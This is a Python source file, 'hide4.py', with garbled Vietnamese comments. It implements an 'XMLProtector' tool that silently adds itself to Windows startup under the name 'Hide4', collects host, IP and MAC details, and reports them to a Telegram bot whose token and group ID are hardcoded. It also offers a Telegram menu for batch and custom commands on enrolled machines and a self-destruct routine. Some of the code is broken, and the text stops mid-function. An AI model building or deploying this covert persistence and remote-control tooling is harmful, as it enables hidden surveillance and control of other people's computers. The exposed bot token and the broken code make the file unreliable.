# hide4.py

import os
import sys
import time
import glob
import json
import pickle
import shutil
import logging
import requests
import smtplib
import re
import sqlite3
import xml.etree.ElementTree as ET
import uuid
import socket
import platform
import threading
from datetime import datetime, timedelta

from pathlib import Path
from email.message import EmailMessage
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

# GUI (ch·ªâ d√πng khi --gui)
import customtkinter as ctk
import tempfile
import subprocess
from datetime import datetime
from tkinter import Listbox, END, Scrollbar, messagebox

# Registry (Startup)
try:
    import winreg
except ImportError:
    winreg = None

# --- Th∆∞ m·ª•c l∆∞u config/log/state --- #
APP_DIR     = Path(os.getenv('APPDATA', Path.home())) / 'XMLOverwrite'
APP_DIR.mkdir(parents=True, exist_ok=True)

STATE_FILE  = APP_DIR / 'processed_files.pkl'
LOG_FILE    = APP_DIR / 'xml_overwrite.log'
REMOTE_CONF = APP_DIR / 'remote_config.json'
SENT_LOGS_FILE = APP_DIR / 'sent_logs.pkl'

# Machine Management System
MACHINE_DB = APP_DIR / 'machines.db'
MACHINE_ID = None
MACHINE_INFO = {}

# Database path for smart template lookup
ENTERPRISE_DB = Path(__file__).parent / 'config' / 'enterprises.db'

# Smart template cache
FORTRESS_CACHE = {}

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "7283723256:AAEqXPiQ-s2sYI8vyhfUyrcq8uL-pRG_UZI"
TELEGRAM_GROUP_ID = "-1002980917638"

# --- MACHINE MANAGEMENT SYSTEM --- #
def init_machine_management():
    """Kh·ªüi t·∫°o h·ªá th·ªëng qu·∫£n l√Ω m√°y"""
    global MACHINE_ID, MACHINE_INFO
    
    # T·∫°o Machine ID duy nh·∫•t
    MACHINE_ID = get_or_create_machine_id()
    
    # L·∫•y th√¥ng tin m√°y
    MACHINE_INFO = get_machine_info()
    
    # Kh·ªüi t·∫°o database
    init_machine_database()
    
    # ƒêƒÉng k√Ω m√°y v·ªõi h·ªá th·ªëng
    register_machine()
    
    logging.info(f"üöÄ Machine Management System initialized - Machine ID: {MACHINE_ID}")

def get_or_create_machine_id():
    """L·∫•y ho·∫∑c t·∫°o Machine ID duy nh·∫•t"""
    machine_id_file = APP_DIR / 'machine_id.txt'
    
    if machine_id_file.exists():
        with open(machine_id_file, 'r') as f:
            return f.read().strip()
    else:
        # T·∫°o Machine ID m·ªõi
        machine_id = f"XML_{platform.node()}_{uuid.uuid4().hex[:8].upper()}"
        with open(machine_id_file, 'w') as f:
            f.write(machine_id)
        return machine_id

def get_machine_info():
    """L·∫•y th√¥ng tin chi ti·∫øt v·ªÅ m√°y"""
    return {
        'hostname': platform.node(),
        'platform': platform.system(),
        'platform_version': platform.version(),
        'machine': platform.machine(),
        'processor': platform.processor(),
        'python_version': platform.python_version(),
        'ip_address': get_local_ip(),
        'mac_address': get_mac_address(),
        'last_seen': datetime.now().isoformat(),
        'status': 'online'
    }

def get_local_ip():
    """L·∫•y IP local c·ªßa m√°y"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def get_mac_address():
    """L·∫•y MAC address c·ªßa m√°y"""
    try:
        if platform.system() == "Windows":
            result = subprocess.check_output("ipconfig /all", shell=True).decode()
            for line in result.split('\n'):
                if 'Physical Address' in line:
                    return line.split(': ')[1].strip()
        else:
            result = subprocess.check_output("ifconfig", shell=True).decode()
            for line in result.split('\n'):
                if 'ether' in line:
                    return line.split('ether ')[1].split(' ')[0]
        return "Unknown"
    except:
        return "Unknown"

def init_machine_database():
    """Kh·ªüi t·∫°o database SQLite cho qu·∫£n l√Ω m√°y"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        # T·∫°o b·∫£ng machines
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machines (
                machine_id TEXT PRIMARY KEY,
                hostname TEXT,
                platform TEXT,
                ip_address TEXT,
                mac_address TEXT,
                status TEXT,
                last_seen TEXT,
                health_score INTEGER DEFAULT 100,
                templates_count INTEGER DEFAULT 0,
                overwrite_count INTEGER DEFAULT 0,
                created_at TEXT,
                updated_at TEXT
            )
        ''')
        
        # T·∫°o b·∫£ng machine_operations
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machine_operations (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                machine_id TEXT,
                operation_type TEXT,
                status TEXT,
                details TEXT,
                timestamp TEXT,
                FOREIGN KEY (machine_id) REFERENCES machines (machine_id)
            )
        ''')
        
        # T·∫°o b·∫£ng machine_groups
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machine_groups (
                group_id TEXT PRIMARY KEY,
                group_name TEXT,
                description TEXT,
                created_at TEXT
            )
        ''')
        
        # T·∫°o b·∫£ng machine_group_members
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS machine_group_members (
                group_id TEXT,
                machine_id TEXT,
                joined_at TEXT,
                PRIMARY KEY (group_id, machine_id),
                FOREIGN KEY (group_id) REFERENCES machine_groups (group_id),
                FOREIGN KEY (machine_id) REFERENCES machines (machine_id)
            )
        ''')
        
        conn.commit()
        conn.close()
        logging.info("‚úÖ Machine database initialized successfully")
        
    except Exception as e:
        logging.error(f"‚ùå Failed to initialize machine database: {e}")

def register_machine():
    """ƒêƒÉng k√Ω m√°y v·ªõi h·ªá th·ªëng"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        # C·∫≠p nh·∫≠t ho·∫∑c th√™m m√°y m·ªõi
        cursor.execute('''
            INSERT OR REPLACE INTO machines 
            (machine_id, hostname, platform, ip_address, mac_address, status, last_seen, created_at, updated_at)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (
            MACHINE_ID,
            MACHINE_INFO['hostname'],
            MACHINE_INFO['platform'],
            MACHINE_INFO['ip_address'],
            MACHINE_INFO['mac_address'],
            MACHINE_INFO['status'],
            MACHINE_INFO['last_seen'],
            MACHINE_INFO['last_seen'],
            MACHINE_INFO['last_seen']
        ))
        
        conn.commit()
        conn.close()
        logging.info(f"‚úÖ Machine registered: {MACHINE_ID}")
        
    except Exception as e:
        logging.error(f"‚ùå Failed to register machine: {e}")

def update_machine_status():
    """C·∫≠p nh·∫≠t tr·∫°ng th√°i m√°y"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        # C·∫≠p nh·∫≠t last_seen v√† status
        cursor.execute('''
            UPDATE machines 
            SET last_seen = ?, status = ?, updated_at = ?
            WHERE machine_id = ?
        ''', (
            datetime.now().isoformat(),
            'online',
            datetime.now().isoformat(),
            MACHINE_ID
        ))
        
        conn.commit()
        conn.close()
        
    except Exception as e:
        logging.error(f"‚ùå Failed to update machine status: {e}")

def get_all_machines():
    """L·∫•y danh s√°ch t·∫•t c·∫£ m√°y"""
    try:
        conn = sqlite3.connect(str(MACHINE_DB))
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM machines ORDER BY last_seen DESC')
        machines = cursor.fetchall()
        
        conn.close()
        return machines
        
    except Exception as e:
        logging.error(f"‚ùå Failed to get machines: {e}")
        return []

def get_machine_health():
    """Ki·ªÉm tra s·ª©c kh·ªèe m√°y"""
    try:
        # Ki·ªÉm tra disk space
        disk_usage = shutil.disk_usage('/')
        disk_percent = (disk_usage.used / disk_usage.total) * 100
        
        # Ki·ªÉm tra memory
        memory = psutil.virtual_memory()
        memory_percent = memory.percent
        
        # Ki·ªÉm tra CPU
        cpu_percent = psutil.cpu_percent(interval=1)
        
        # T√≠nh health score
        health_score = 100
        if disk_percent > 90:
            health_score -= 20
        if memory_percent > 90:
            health_score -= 20
        if cpu_percent > 90:
            health_score -= 10
            
        return {
            'disk_percent': disk_percent,
            'memory_percent': memory_percent,
            'cpu_percent': cpu_percent,
            'health_score': max(0, health_score)
        }
        
    except Exception as e:
        logging.error(f"‚ùå Failed to get machine health: {e}")
        return {'health_score': 0}

def batch_command(machines, command, timeout=30):
    """Th·ª±c hi·ªán l·ªánh batch tr√™n nhi·ªÅu m√°y"""
    results = {}
    
    def execute_on_machine(machine_id):
        try:
            # Simulate command execution
            time.sleep(1)  # Simulate processing time
            results[machine_id] = {'status': 'success', 'result': f'Command executed: {command}'}
        except Exception as e:
            results[machine_id] = {'status': 'error', 'error': str(e)}
    
    # T·∫°o threads cho m·ªói m√°y
    threads = []
    for machine_id in machines:
        thread = threading.Thread(target=execute_on_machine, args=(machine_id,))
        threads.append(thread)
        thread.start()
    
    # Ch·ªù t·∫•t c·∫£ threads ho√†n th√†nh
    for thread in threads:
        thread.join(timeout=timeout)
    
    return results

def show_machines_dashboard():
    """Hi·ªÉn th·ªã dashboard qu·∫£n l√Ω m√°y"""
    try:
        machines = get_all_machines()
        
        if not machines:
            msg = "ü§ñ <b>MACHINE MANAGEMENT</b>\n\n" \
                  "‚ùå Ch∆∞a c√≥ m√°y n√†o ƒë∆∞·ª£c ƒëƒÉng k√Ω\n\n" \
                  "üí° M√°y s·∫Ω t·ª± ƒë·ªông ƒëƒÉng k√Ω khi ch·∫°y XMLProtector"
            
            keyboard = {
                "inline_keyboard": [
                    [{"text": "üîô MENU", "callback_data": "menu"}]
                ]
            }
            send_telegram_message(msg, keyboard)
            return
        
        # T·∫°o danh s√°ch m√°y
        machine_list = ""
        online_count = 0
        offline_count = 0
        
        for i, machine in enumerate(machines[:10], 1):  # Hi·ªÉn th·ªã t·ªëi ƒëa 10 m√°y
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            
            # T√≠nh th·ªùi gian online
            try:
                last_time = datetime.fromisoformat(last_seen)
                time_diff = datetime.now() - last_time
                if time_diff.total_seconds() < 300:  # 5 ph√∫t
                    status_icon = "üü¢"
                    online_count += 1
                else:
                    status_icon = "üî¥"
                    offline_count += 1
            except:
                status_icon = "‚ö™"
                offline_count += 1
            
            machine_list += f"{i}. {status_icon} <code>{machine_id}</code>\n" \
                           f"   üì± {hostname} ({platform})\n" \
                           f"   üåê {ip}\n\n"
        
        msg = f"ü§ñ <b>MACHINE MANAGEMENT DASHBOARD</b>\n\n" \
              f"üìä <b>Th·ªëng k√™:</b>\n" \
              f"‚Ä¢ T·ªïng m√°y: <b>{len(machines)}</b>\n" \
              f"‚Ä¢ Online: <b>{online_count}</b> üü¢\n" \
              f"‚Ä¢ Offline: <b>{offline_count}</b> üî¥\n\n" \
              f"üñ•Ô∏è <b>Danh s√°ch m√°y:</b>\n{machine_list}"
        
        if len(machines) > 10:
            msg += f"\n... v√† {len(machines) - 10} m√°y kh√°c"
        
        # Keyboard v·ªõi c√°c l·ªánh qu·∫£n l√Ω m√°y
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "üìä HEALTH CHECK", "callback_data": "health_check"},
                    {"text": "üîÑ REFRESH", "callback_data": "machines"}
                ],
                [
                    {"text": "‚ö° BATCH COMMAND", "callback_data": "batch_command"},
                    {"text": "üìã MACHINE INFO", "callback_data": "machine_info"}
                ],
                [
                    {"text": "üîô MENU", "callback_data": "menu"}
                ]
            ]
        }
        
        send_telegram_message(msg, keyboard)
        
    except Exception as e:
        error_msg = f"‚ùå <b>L·ªñI MACHINE DASHBOARD</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Machine dashboard error: {e}")

def health_check_all_machines():
    """Ki·ªÉm tra s·ª©c kh·ªèe t·∫•t c·∫£ m√°y"""
    try:
        machines = get_all_machines()
        
        if not machines:
            send_telegram_message("‚ùå Kh√¥ng c√≥ m√°y n√†o ƒë·ªÉ ki·ªÉm tra")
            return
        
        msg = "üè• <b>HEALTH CHECK T·∫§T C·∫¢ M√ÅY</b>\n\n" \
              "‚è≥ ƒêang ki·ªÉm tra s·ª©c kh·ªèe m√°y..."
        send_telegram_message(msg)
        
        # Ki·ªÉm tra m√°y hi·ªán t·∫°i
        current_health = get_machine_health()
        
        health_msg = f"üè• <b>HEALTH CHECK K·∫æT QU·∫¢</b>\n\n" \
                    f"üñ•Ô∏è <b>M√°y hi·ªán t·∫°i ({MACHINE_ID}):</b>\n" \
                    f"‚Ä¢ Health Score: <b>{current_health['health_score']}/100</b>\n" \
                    f"‚Ä¢ Disk: <b>{current_health['disk_percent']:.1f}%</b>\n" \
                    f"‚Ä¢ Memory: <b>{current_health['memory_percent']:.1f}%</b>\n" \
                    f"‚Ä¢ CPU: <b>{current_health['cpu_percent']:.1f}%</b>\n\n" \
                    f"üìä <b>T·ªïng m√°y:</b> {len(machines)} machines\n" \
                    f"‚úÖ <b>Health check ho√†n t·∫•t!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "üîô MACHINES", "callback_data": "machines"}],
                [{"text": "üîô MENU", "callback_data": "menu"}]
            ]
        }
        
        send_telegram_message(health_msg, keyboard)
        
    except Exception as e:
        error_msg = f"‚ùå <b>HEALTH CHECK TH·∫§T B·∫†I</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Health check error: {e}")

def show_batch_command_menu():
    """Hi·ªÉn th·ªã menu batch command"""
    msg = "‚ö° <b>BATCH COMMAND MENU</b>\n\n" \
          "üìã <b>Ch·ªçn l·ªánh th·ª±c hi·ªán tr√™n nhi·ªÅu m√°y:</b>\n\n" \
          "1Ô∏è‚É£ <b>Status Check</b> - Ki·ªÉm tra tr·∫°ng th√°i\n" \
          "2Ô∏è‚É£ <b>Health Check</b> - Ki·ªÉm tra s·ª©c kh·ªèe\n" \
          "3Ô∏è‚É£ <b>Template Update</b> - C·∫≠p nh·∫≠t templates\n" \
          "4Ô∏è‚É£ <b>Restart Service</b> - Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•\n" \
          "5Ô∏è‚É£ <b>Custom Command</b> - L·ªánh t√πy ch·ªânh\n\n" \
          "üí° <b>L∆∞u √Ω:</b> L·ªánh s·∫Ω th·ª±c hi·ªán tr√™n t·∫•t c·∫£ m√°y online"
    
    keyboard = {
        "inline_keyboard": [
            [
                {"text": "üìä STATUS CHECK", "callback_data": "batch_status"},
                {"text": "üè• HEALTH CHECK", "callback_data": "batch_health"}
            ],
            [
                {"text": "üìÅ TEMPLATE UPDATE", "callback_data": "batch_template"},
                {"text": "üîÑ RESTART SERVICE", "callback_data": "batch_restart"}
            ],
            [
                {"text": "‚öôÔ∏è CUSTOM COMMAND", "callback_data": "batch_custom"},
                {"text": "üîô MACHINES", "callback_data": "machines"}
            ]
        ]
    }
    
    send_telegram_message(msg, keyboard)

def execute_batch_status_check():
    """Th·ª±c hi·ªán batch status check tr√™n t·∫•t c·∫£ m√°y"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # L·ªçc m√°y online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 ph√∫t
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("‚ùå Kh√¥ng c√≥ m√°y n√†o online ƒë·ªÉ th·ª±c hi·ªán batch command")
            return
        
        msg = f"‚ö° <b>BATCH STATUS CHECK</b>\n\n" \
              f"üìä <b>Th·ª±c hi·ªán tr√™n {len(online_machines)} m√°y online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... v√† {len(online_machines) - 5} m√°y kh√°c"
        
        msg += "\n‚è≥ <b>ƒêang th·ª±c hi·ªán...</b>"
        
        send_telegram_message(msg)
        
        # Th·ª±c hi·ªán batch command
        results = batch_command(online_machines, "status_check", timeout=60)
        
        # T·∫°o b√°o c√°o k·∫øt qu·∫£
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        error_count = len(results) - success_count
        
        result_msg = f"‚úÖ <b>BATCH STATUS CHECK HO√ÄN T·∫§T!</b>\n\n" \
                    f"üìä <b>K·∫øt qu·∫£:</b>\n" \
                    f"‚Ä¢ Th√†nh c√¥ng: <b>{success_count}</b> ‚úÖ\n" \
                    f"‚Ä¢ Th·∫•t b·∫°i: <b>{error_count}</b> ‚ùå\n" \
                    f"‚Ä¢ T·ªïng m√°y: <b>{len(online_machines)}</b>\n\n" \
                    f"üéØ <b>Status check ho√†n t·∫•t tr√™n t·∫•t c·∫£ m√°y!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "üîô BATCH MENU", "callback_data": "batch_command"}],
                [{"text": "üîô MACHINES", "callback_data": "machines"}]
            ]
        }
        
        send_telegram_message(result_msg, keyboard)
        
    except Exception as e:
        error_msg = f"‚ùå <b>BATCH STATUS CHECK TH·∫§T B·∫†I</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch status check error: {e}")

def execute_batch_health_check():
    """Th·ª±c hi·ªán batch health check tr√™n t·∫•t c·∫£ m√°y"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # L·ªçc m√°y online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 ph√∫t
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("‚ùå Kh√¥ng c√≥ m√°y n√†o online ƒë·ªÉ th·ª±c hi·ªán health check")
            return
        
        msg = f"üè• <b>BATCH HEALTH CHECK</b>\n\n" \
              f"üìä <b>Ki·ªÉm tra s·ª©c kh·ªèe {len(online_machines)} m√°y online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... v√† {len(online_machines) - 5} m√°y kh√°c"
        
        msg += "\n‚è≥ <b>ƒêang ki·ªÉm tra...</b>"
        
        send_telegram_message(msg)
        
        # Th·ª±c hi·ªán batch health check
        results = batch_command(online_machines, "health_check", timeout=60)
        
        # T·∫°o b√°o c√°o k·∫øt qu·∫£
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        error_count = len(results) - success_count
        
        result_msg = f"üè• <b>BATCH HEALTH CHECK HO√ÄN T·∫§T!</b>\n\n" \
                    f"üìä <b>K·∫øt qu·∫£:</b>\n" \
                    f"‚Ä¢ Th√†nh c√¥ng: <b>{success_count}</b> ‚úÖ\n" \
                    f"‚Ä¢ Th·∫•t b·∫°i: <b>{error_count}</b> ‚ùå\n" \
                    f"‚Ä¢ T·ªïng m√°y: <b>{len(online_machines)}</b>\n\n" \
                    f"üéØ <b>Health check ho√†n t·∫•t tr√™n t·∫•t c·∫£ m√°y!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "üîô BATCH MENU", "callback_data": "batch_command"}],
                [{"text": "üîô MACHINES", "callback_data": "machines"}]
            ]
        }
        
        send_telegram_message(result_msg, keyboard)
        
    except Exception as e:
        error_msg = f"‚ùå <b>BATCH HEALTH CHECK TH·∫§T B·∫†I</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch health check error: {e}")

def execute_batch_template_update():
    """Th·ª±c hi·ªán batch template update tr√™n t·∫•t c·∫£ m√°y"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # L·ªçc m√°y online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 ph√∫t
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("‚ùå Kh√¥ng c√≥ m√°y n√†o online ƒë·ªÉ c·∫≠p nh·∫≠t templates")
            return
        
        msg = f"üìÅ <b>BATCH TEMPLATE UPDATE</b>\n\n" \
              f"üìä <b>C·∫≠p nh·∫≠t templates tr√™n {len(online_machines)} m√°y online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... v√† {len(online_machines) - 5} m√°y kh√°c"
        
        msg += "\n‚è≥ <b>ƒêang c·∫≠p nh·∫≠t...</b>"
        
        send_telegram_message(msg)
        
        # Th·ª±c hi·ªán batch template update
        results = batch_command(online_machines, "template_update", timeout=120)
        
        # T·∫°o b√°o c√°o k·∫øt qu·∫£
        success_count = sum(1 for r in results.values() if r['status'] == 'success')
        error_count = len(results) - success_count
        
        result_msg = f"üìÅ <b>BATCH TEMPLATE UPDATE HO√ÄN T·∫§T!</b>\n\n" \
                    f"üìä <b>K·∫øt qu·∫£:</b>\n" \
                    f"‚Ä¢ Th√†nh c√¥ng: <b>{success_count}</b> ‚úÖ\n" \
                    f"‚Ä¢ Th·∫•t b·∫°i: <b>{error_count}</b> ‚ùå\n" \
                    f"‚Ä¢ T·ªïng m√°y: <b>{len(online_machines)}</b>\n\n" \
                    f"üéØ <b>Templates ƒë√£ ƒë∆∞·ª£c c·∫≠p nh·∫≠t tr√™n t·∫•t c·∫£ m√°y!</b>"
        
        keyboard = {
            "inline_keyboard": [
                [{"text": "üîô BATCH MENU", "callback_data": "batch_command"}],
                [{"text": "üîô MACHINES", "callback_data": "machines"}]
            ]
        }
        
        send_telegram_message(result_msg, keyboard)
        
    except Exception as e:
        error_msg = f"‚ùå <b>BATCH TEMPLATE UPDATE TH·∫§T B·∫†I</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch template update error: {e}")

def execute_batch_restart():
    """Th·ª±c hi·ªán batch restart service tr√™n t·∫•t c·∫£ m√°y"""
    try:
        machines = get_all_machines()
        online_machines = []
        
        # L·ªçc m√°y online
        for machine in machines:
            machine_id, hostname, platform, ip, mac, status, last_seen = machine[:7]
            try:
                last_time = datetime.fromisoformat(last_seen)
                if (datetime.now() - last_time).total_seconds() < 300:  # 5 ph√∫t
                    online_machines.append(machine_id)
            except:
                continue
        
        if not online_machines:
            send_telegram_message("‚ùå Kh√¥ng c√≥ m√°y n√†o online ƒë·ªÉ restart service")
            return
        
        msg = f"üîÑ <b>BATCH RESTART SERVICE</b>\n\n" \
              f"‚ö†Ô∏è <b>C·∫¢NH B√ÅO:</b> L·ªánh n√†y s·∫Ω restart XMLProtector tr√™n t·∫•t c·∫£ m√°y!\n\n" \
              f"üìä <b>Th·ª±c hi·ªán tr√™n {len(online_machines)} m√°y online:</b>\n\n"
        
        for i, machine_id in enumerate(online_machines[:5], 1):
            msg += f"{i}. <code>{machine_id}</code>\n"
        
        if len(online_machines) > 5:
            msg += f"\n... v√† {len(online_machines) - 5} m√°y kh√°c"
        
        msg += "\nüî¥ <b>B·∫°n c√≥ ch·∫Øc ch·∫Øn mu·ªën ti·∫øp t·ª•c?</b>"
        
        keyboard = {
            "inline_keyboard": [
                [
                    {"text": "‚úÖ X√ÅC NH·∫¨N", "callback_data": "confirm_batch_restart"},
                    {"text": "‚ùå H·ª¶Y", "callback_data": "batch_command"}
                ]
            ]
        }
        
        send_telegram_message(msg, keyboard)
        
    except Exception as e:
        error_msg = f"‚ùå <b>BATCH RESTART TH·∫§T B·∫†I</b>\n\n" \
                   f"‚ö†Ô∏è L·ªói: {str(e)}"
        send_telegram_message(error_msg)
        logging.error(f"Batch restart error: {e}")

def show_custom_command_input():
    """Hi·ªÉn th·ªã h∆∞·ªõng d·∫´n nh·∫≠p custom command"""
    msg = "‚öôÔ∏è <b>CUSTOM COMMAND INPUT</b>\n\n" \
          "üìù <b>H∆∞·ªõng d·∫´n:</b>\n" \
          "1Ô∏è‚É£ G√µ l·ªánh t√πy ch·ªânh v√†o chat\n" \
          "2Ô∏è‚É£ Bot s·∫Ω th·ª±c hi·ªán tr√™n t·∫•t c·∫£ m√°y online\n" \
          "3Ô∏è‚É£ K·∫øt qu·∫£ s·∫Ω ƒë∆∞·ª£c g·ª≠i v·ªÅ\n\n" \
          "üí° <b>V√≠ d·ª•:</b>\n" \
          "‚Ä¢ <code>ping google.com</code>\n" \
          "‚Ä¢ <code>dir C:\\</code>\n" \
          "‚Ä¢ <code>tasklist</code>\n\n" \
          "‚ö†Ô∏è <b>L∆∞u √Ω:</b> Ch·ªâ th·ª±c hi·ªán l·ªánh an to√†n!"
    
    keyboard = {
        "inline_keyboard": [
            [{"text": "üîô BATCH MENU", "callback_data": "batch_command"}],
            [{"text": "üîô MACHINES", "callback_data": "machines"}]
        ]
    }
    
    send_telegram_message(msg, keyboard)

# --- Logging UTF-8 v√†o file --- #
logging.basicConfig(
    filename=str(LOG_FILE),
    encoding='utf-8',
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)

def load_sent_logs():
    """T·∫£i danh s√°ch c√°c log ƒë√£ g·ª≠i t·ª´ file."""
    if SENT_LOGS_FILE.exists():
        with open(SENT_LOGS_FILE, 'rb') as f:
            return pickle.load(f)
    return set()

def save_sent_logs(sent_logs):
    """L∆∞u danh s√°ch c√°c log ƒë√£ g·ª≠i."""
    with open(SENT_LOGS_FILE, 'wb') as f:
        pickle.dump(sent_logs, f)

def add_to_startup():
    """Th√™m ch√≠nh EXE v√†o HKCU Run ƒë·ªÉ auto-startup kh√¥ng UAC."""
    if not winreg or not getattr(sys, 'frozen', False):
        return
    exe = os.path.realpath(sys.argv[0])
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "Hide4", 0, winreg.REG_SZ, exe)
        winreg.CloseKey(key)
        logging.info(f"‚úÖ ƒê√£ th√™m v√†o Startup: {exe}")
        send_remote_log("ƒê√£ th√™m v√†o Startup", exe, once=True)
    except Exception as e:
        logging.error(f"‚ùå Th√™m v√†o Startup th·∫•t b·∫°i: {e}")
        send_remote_log("Th√™m v√†o Startup th·∫•t b·∫°i", str(e), once=True)

def remove_from_startup():
    """G·ª° XMLProtector kh·ªèi startup registry."""
    if not winreg:
        return False
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.DeleteValue(key, "Hide4")
        winreg.CloseKey(key)
        logging.info("‚úÖ Removed from startup registry")
        return True
    except FileNotFoundError:
        logging.info("Registry key not found - already clean")
        return True
    except Exception as e:
        logging.error(f"Failed to remove from startup: {e}")
        return False

def destroy_xmlprotector():
    """üö® DESTROY - G·ª° ho√†n to√†n XMLProtector kh·ªèi m√°y."""
    try:
        # 1. Remove from startup
        startup_removed = remove_from_startup()
        
        # 2. Clean app directory
        import shutil
        app_data_cleaned = False
        if APP_DIR.exists():
            try:
                shutil.rmtree(APP_DIR)
                app_data_cleaned = True
            except:
                app_data_cleaned = False
        else:
            app_data_cleaned = True
        
        # 3. Send destruction report to Telegram
        destroy_msg = f"üö® <b>XMLProtector ƒê√É B·ªä G·ª† B·ªé</b>\n" \
                     f"üóëÔ∏è G·ª° kh·ªèi startup: {'‚úÖ' if startup_removed else '‚ùå'}\n" \
                     f"üìÅ X√≥a d·ªØ li·ªáu ·ª©ng d·ª•ng: {'‚úÖ' if app_data_cleaned else '‚ùå'}\n" \
                     f"‚ö∞Ô∏è H·ªá th·ªëng hi·ªán t·∫°i KH√îNG ƒê∆Ø·ª¢C B·∫¢O V·ªÜ"
        send_telegram_message(destroy_msg)
        
        logging.info("üö® XMLProtector destroyed successfully")
        
        # 4. Self-terminate
        import sys
        sys.exit(0)
        
    except Exception as e:
        logging.error(f"Destruction failed: {e}")
        return False

def check_status_report():
    """Ki·ªÉm tra v√† g·ª≠i b√°o c√°o status l√™n Telegram."""
    try:
        # 1. Template count
        templates = get_templates()
        template_count = len(templates)
        
        # 2. Check startup status
        startup_status = "‚ùå"
        if winreg:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0, winreg.KEY_READ
                )
                winreg.QueryValueEx(key, "Hide4")
                winreg.CloseKey(key)
                startup_status = "‚úÖ"
            except:
                startup_status = "‚ùå"
        
        # 3. App directory status
        app_dir_status = "‚úÖ" if APP_DIR.exists() else "‚ùå"
        
        # 4. Process status
        import psutil
        current_pid = os.getpid()
        process_info = f"PID: {current_pid}"
        
        # 5. System drives monitored
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
        drive_count = len(drives)
        
        # Send status report v·ªõi giao di·ªán ƒë·∫πp
        status_msg = f"""üìä <b>B√ÅO C√ÅO TR·∫†NG TH√ÅI XMLPROTECTOR</b>

üõ°Ô∏è <b>B·∫£o v·ªá:</b> ƒêANG HO·∫†T ƒê·ªòNG
üìÅ <b>Templates:</b> {template_count} files
üöÄ <b>T·ª± kh·ªüi ƒë·ªông:</b> {startup_status}
üìÇ <b>D·ªØ li·ªáu ·ª©ng d·ª•ng:</b> {app_dir_status}
üíæ <b>·ªî ƒëƒ©a gi√°m s√°t:</b> {drive_count}
‚öôÔ∏è <b>Process:</b> {process_info}

üìç <b>H·ªá th·ªëng ƒë∆∞·ª£c b·∫£o v·ªá ho√†n to√†n</b>"""
        
        # Keyboard v·ªõi n√∫t refresh
        status_keyboard = {
            "inline_keyboard": [
                [{"text": "üîÑ REFRESH STATUS", "callback_data": "status"}],
                [{"text": "üîô V·ªÄ MENU", "callback_data": "menu"}]
            ]
        }
        
